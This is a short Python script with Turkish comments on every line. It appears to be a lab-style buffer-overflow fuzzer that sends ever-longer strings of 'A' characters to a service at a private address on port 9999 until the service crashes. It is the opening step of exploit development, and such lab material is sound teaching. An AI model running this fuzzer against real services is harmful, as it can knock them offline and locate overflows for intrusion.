# Python 3 yorumlayıcısının bulunduğu yerin tam yolunu belirtir.
#!/usr/bin/env python3 

import sys,time,socket # # sys,time ve socket kütüphanelerini programınıza dahil eder.
ip = "192.168.1.63" # Program, bu IP adresine bağlantı kurmayı deneyecektir.
port = 9999 # Program, bu port üzerinden bağlantı kurmayı deneyecektir.
timeout = 5 # Bağlantı kurma işlemi 5 saniyeden daha uzun sürerse işlem sona erer.

# Gönderilecek verinin başına eklenmesi gereken bir ön ek (prefix) belirtir. 
prefix = ""

# Gönderilecek veriyi oluşturur. "string" değişkenine, "prefix" değerini ve ardından 100 adet "A" karakterini içeren bir dize atanır.
string = prefix + "A" * 100

while True:  # Sonsuz bir döngü başlatır.
	try: # Hata olasılığı olan işlemleri denemek için bir "try-except" bloğu başlatır.
		with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s: # IPv4 ağ soketi oluşturur ve "s" adında bir değişkene atar.
			s.settimeout(timeout) # Soket işlemlerinin zaman aşımı süresini "timeout" değişkenin değeri ile ayarlar.
			s.connect((ip,port)) # Belirtilen IP adresi ve port numarasına bir bağlantı kurar.
			s.recv(1024) # Sunucudan en fazla 1024 bayt veri alır. Bu, sunucunun gönderdiği yanıtı almak için kullanılır.
			print ("Fuzzing with {} bytes".format(len(string)-len(prefix))) # Gönderilen verinin kaç bayt olduğunu ekrana yazdırır.
			s.send(bytes(string,"latin-1")) # Belirtilen dizedeki veriyi sunucuya gönderir. bytes() işlevi, dizeyi baytlara dönüştürmek için kullanılır.
			s.recv(1024) # Sunucudan en fazla 1024 bayt veri alır. Bu, sunucunun ikinci bir yanıtını almak için kullanılır.
	except: # Bir hata oluştuğunda çalışacak olan "try-except" bloğunun "except" kısmını başlatır.
		print ("Fuzzing crashed at {}".format(len(string)-len(prefix))) # Bir hata durumunda kaç bayt veri gönderildiğini ekrana yazdırır.
		sys.exit(0) # Programın hata durumunda sonlanmasını sağlar.
	string = string+ "A"*100 # "string" değişkenine 100 adet daha "A" karakteri ekler. Bu, her döngüde gönderilecek verinin boyutunu artırır.
	time.sleep(1) # Programın 1 saniye boyunca uyumasını sağlar. Bu, her döngü arasında 1 saniye bekleme süresi ekler ve hedefe sürekli olarak veri gönderilirken programın çok hızlı çalışmasını engeller.

